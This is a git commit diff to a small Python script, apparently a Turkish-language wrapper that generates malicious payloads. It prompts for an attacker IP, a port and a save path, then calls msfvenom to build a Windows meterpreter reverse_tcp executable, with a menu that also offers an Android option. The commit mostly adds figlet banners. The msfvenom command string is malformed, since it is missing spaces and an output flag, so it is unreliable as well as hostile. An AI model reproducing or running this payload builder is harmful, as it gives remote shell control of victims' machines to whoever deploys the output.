de4ed64f331c3a15261cc7b8533982fd7d652eb6
Superman-ctrl <59845995+Superman-ctrl@users.noreply.github.com>
2020-02-27 21:59:26 +0300

    3xploit.py
    Add an description.

--- 3xploit.py
+++ 3xploit.py
@@ -1,21 +1,27 @@
 import os
 
 os.system("apt install figlet")
-os.system("figlet Hosgeldin Aven !!")
+os.system("figlet Aven3xploit")
 
+os.system("figlet IP")
 ip = input("Local veya Dış IP Gir: ")
+
+os.system("figlet PORT")
 port = input("Portunuz : ")
 
+
+os.system("figlet Kayit Yeri")
 kytyrı = input("Kayıt Edilecek Dosya Yolu : ")
 
 giris8 = """
-================
+===================
 [1] Android Exploit  <===
 [2] Windows Exploit  <===
-===============
+===================
       """
 print(giris8)
 
+os.system("figlet 3xploit")
 apk = input("Exploit'in Adını Giriniz : ")
 payload = input("Numara Seç : ")
 
@@ -25,7 +31,7 @@ if payload == '1':
 if payload == '2':
 	os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + "LPORT=" + port + "-f exe" + kytyrı)
 
-#=================================
+#================================
 #Superman Tarafından Yapılmıştır.
 #Aven William
-#=================================
+#================================
